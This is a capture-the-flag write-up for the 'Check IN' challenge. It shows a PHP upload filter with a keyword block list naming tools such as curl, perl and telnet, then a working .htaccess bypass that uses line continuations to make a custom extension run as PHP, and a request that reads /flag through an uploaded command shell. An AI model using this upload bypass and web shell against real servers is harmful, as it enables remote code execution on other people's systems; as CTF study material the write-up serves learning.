# Check IN

## Description

The web app had file upload functionality. User files uploads to the: /uploads/[md5(REMOTE_ADDR)]/

And all sending content passes via the following filters:
```php
$black = file_get_contents($tmp_name);
if (!$tmp_name) {
    $result1 ="???";
}else if (!$name) {
    $result1 ="filename cannot be empty!";
}
else if (preg_match("/ph|ml|js|cg/i", $name)) {
    $result1 = "filename error";
}
else if (!in_array($_FILES["fileUpload"]['type'], $typeAccepted)) {
    $result1 = 'filetype error';
}
else if (preg_match("/perl|pyth|ph|auto|curl|base|>|rm|ruby|openssl|war|lua|msf|xter|telnet/i",$black)){
    $result1 = "perl|pyth|ph|auto|curl|base|>|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!";
}
```

# Solution

We had to deal with the apache server and could upload the ".htaccess" file to change the apache configuration settings for our folder.

After tring CGI script, RewriteRules, Indexes, server-status, server-info and etc. that could be helpful, we found that htaccess files supports multi lines like:


```
SetHa\
ndler server-status
```

It means, that we could bypass the filter and configure `PHP` interpreter to work with other extensions:
```
AddHandler application/x-httpd-p\
hp .foo
```

There was only one problem, that we should use `<?php` tags, and short PHP tags didn't work.

But we already know that if apache was runned with `mod_php`, we can change PHP ini directives from the `.htaccess`. Example:

```
php_value short_open_tag 1
```

The finals `.htaccess` file:

```
AddHandler application/x-httpd-p\
hp .foo

p\
hp_value short_open_tag 1
```

After that we could execute files with the ".foo" extension as PHP files.

Request:
```
/uploads/831e75264dcb2b93527461c0608310f8/check.foo?cmd=cat%20/flag
```

Flag:

```
De1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll}
```

